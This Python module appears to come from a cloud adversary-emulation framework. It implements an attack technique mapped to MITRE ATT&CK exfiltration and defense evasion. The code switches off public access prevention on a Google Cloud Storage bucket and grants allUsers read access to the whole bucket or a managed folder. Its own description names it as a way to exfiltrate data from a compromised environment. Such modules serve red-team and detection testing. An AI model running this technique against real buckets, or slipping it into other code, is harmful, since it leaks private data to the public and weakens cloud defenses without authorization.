import base64
import json
from os import access
import requests
from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry

from typing import Dict, Any

from core.gcp.gcp_access import GCPAccess
from google.cloud import storage, storage_control_v2
from google.cloud.storage.constants import PUBLIC_ACCESS_PREVENTION_INHERITED
from google.oauth2.service_account import Credentials as ServiceAccountCredentials
from google.auth.transport.requests import Request
import google.api_core.exceptions

@TechniqueRegistry.register
class GCPExposePublicCloudStorage(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1567",
                technique_name="Exfiltration Over Web Service",
                tactics=["Exfiltration"],
                sub_technique_name=None
            ),
            MitreTechnique(
                technique_id="T1562.007",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable or Modify Cloud Firewall"
            )
        ]
        technique_references = [
            TechniqueReference(ref_title = "GCP - Make data public", ref_link = "https://cloud.google.com/storage/docs/access-control/making-data-public")
        ]
        super().__init__(
            name="Expose Public Cloud Storage",
            description="Enable public read access on a Google Cloud Storage bucket by modifying the bucket's IAM policy to allow allUsers to read bucket objects. Optionally, the technique can also expose a specific path within the bucket. This technique is useful for exfiltrating data from a compromised GCP environment. It can be used to make sensitive data publicly accessible, which can lead to data breaches or unauthorized access.",
            mitre_techniques=mitre_techniques,
            references=technique_references
        )
    def execute(self, **kwargs: Any) -> tuple[ExecutionStatus, dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            bucket_name: str = kwargs.get("bucket_name", None)
            path: str = kwargs.get("path", None)
            project_id: str = kwargs.get("project_id", None)
            # Input validation
            if bucket_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Target Bucket Name"}
                }
            # Create storage client using current credentials
            manager = GCPAccess()
            manager.get_current_access()
            credential= manager.credential

            storage_client = storage.Client(project=project_id, credentials=credential)

            # Get the bucket
            bucket = storage_client.get_bucket(bucket_name)
            if not bucket.exists():
                return ExecutionStatus.FAILURE, {
                    "error": f"Bucket {bucket_name} does not exist",
                    "message": f"Failed to access bucket {bucket_name}"
                }
            # Check if path is provided, if not set it to the entire bucket
            if bucket.iam_configuration.public_access_prevention == "enforced":
                bucket.iam_configuration.public_access_prevention = (PUBLIC_ACCESS_PREVENTION_INHERITED)
                bucket.patch()


            if path is None or path == "":
                # Set the IAM policy to allow public read access on bucket level
                policy = bucket.get_iam_policy(requested_policy_version=3)
                policy.bindings.append({
                    "role": "roles/storage.objectViewer",
                    "members": ["allUsers"]
                })
                bucket.set_iam_policy(policy)
                
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully exposed GCP bucket {bucket_name} public",
                    "value": {
                        "bucket_name": bucket_name,
                        "path": f"gs://{bucket_name}",
                        "new_bucket_policy": policy.bindings
                    }
                }
            else:
                # santize path
                path = path.strip("/")
                storage_control_client = storage_control_v2.StorageControlClient(credentials=credential)
                project_path = storage_control_client.common_project_path("_")    
                bucket_path = f"{project_path}/buckets/{bucket_name}"

                # Check if the path is a managed folder
                request = storage_control_v2.GetManagedFolderRequest(
                    name=f"{bucket_path}/managedFolders/{path}"
                )
                try:
                    managed_folder = storage_control_client.get_managed_folder(request=request)
                except google.api_core.exceptions.NotFound:
                    managed_folder = None
                
                # If the managed folder does not exist, create it
                if managed_folder is None:
                    request = storage_control_v2.CreateManagedFolderRequest(
                        parent=bucket_path,
                        managed_folder_id=path,
                    )
                    managed_folder = storage_control_client.create_managed_folder(request=request)
                access_token = credential.token

                # Set Headers for IAM policy update 
                headers = {
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/json"
                }
                # Set the IAM policy to allow public read access on the managed folder
                iam_binding = {
                    "bindings":[
                            {
                            "role": "roles/storage.objectViewer",
                            "members":["allUsers"]
                            }
                        ]
                    }
                json_data = json.dumps(iam_binding).encode('utf-8')
                url = f"https://storage.googleapis.com/storage/v1/b/{bucket_name}/managedFolders/{path}/iam"
                response = requests.put(url, data=json_data, headers=headers)
                response.raise_for_status()  # Raise an exception for HTTP errors (4xx or 5xx)
                
                # managed_folder = storage_control_client.create_managed_folder(request=request)
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully exposed GCP bucket {bucket_name} public on path {path}",
                    "value": {
                        "bucket_name": bucket_name,
                        "path": f"gs://{bucket_name}/{path}",
                        "new_policy_attached_to_path": response.json().get("bindings", [])
                    }
                }


        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to expose GCP bucket to public",
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "project_id": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "GCP Project ID",
                "input_field_type": "text"
            },
            "bucket_name": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Target Bucket Name",
                "input_field_type": "text"
            },
            "path": {
                "type": "str",
                "required": False,
                "default": None,
                "name": "Object Path in Bucket (Optional)",
                "input_field_type": "text"
            }
        }